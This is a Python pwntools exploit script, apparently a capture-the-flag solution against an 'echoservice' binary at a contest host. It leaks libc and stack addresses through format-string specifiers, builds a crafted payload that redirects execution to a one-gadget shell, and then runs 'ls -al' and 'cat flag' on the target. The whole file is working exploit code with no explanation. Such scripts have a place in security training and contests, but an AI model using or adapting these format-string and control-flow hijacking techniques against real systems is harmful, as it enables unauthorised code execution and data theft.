#-*- coding: utf-8 -*-

from pwn import *
context(arch='i386', os='linux')

DEBUG = False

def leak(addr, size, title=""):
	if DEBUG == False:
		return
	print " *** {} : {} ***".format(hex(addr), title)
	print hexdump(p.leak(addr, size))

server = "echo.stillhackinganyway.nl"
port = 1337
target = "./echoservice"

p = None
if len(sys.argv) == 2:
	p = remote(server, port)
else:
	DEBUG = True
	p = process(target)

# %140$lx = stack addr
# &payload = (stack addr - 0x150) - 0x400

payload = "%lx"
p.sendline(payload)
data = p.recv()
libc_addr = int(data.split("] ")[1][:-1], 16) - 0x3c4b40
one_shot  = libc_addr + 0x4526a
print "LIBC    : {}".format(hex(libc_addr))

payload = "%140$lx"
p.sendline(payload)
data = p.recv()
stack_addr = int(data.split("] ")[1][:-1], 16) - 0x150 - 0x400
print "PAYLOAD : {}".format(hex(stack_addr))
leak(stack_addr, 0x40, "&payload")

# for debugging
# stack_addr + 0x40 = "E"*8
# set $rdx=$rbx+0x50

stack_addr += 8

payload =  "%13$@" + "ZZZ"
payload += p64(stack_addr) 				# RBX (stack_addr)
payload += "A2"*4
payload += "B1"*4
payload += "B2"*4
payload += p64(1) 						# cond_3 : *cond_3 & 2 != 0
payload += "C2"*4
payload += "D1"*4
payload += "D2"*4
payload += p64(stack_addr+0x50)         # p64(stack_addr+0x50) -> RDX
payload += "E2"*4
payload += p64(stack_addr+0x50)	        # RDX (=stck_addr+0x50)
payload += p64(stack_addr+0x50+0x30)	# cond_1 : *&cond_1 = 0
payload += p64(one_shot)
payload += "G2"*4
payload += "H1"*4
payload += p64(0x10) 					# cond_1 : < 0x70
payload += p64(0)						# cond_2 : cond_1

leak(stack_addr, 0x80, "&payload")
p.sendline(payload)

p.sendline("ls -al")
print p.recv()

p.sendline("cat flag")
print p.recv()
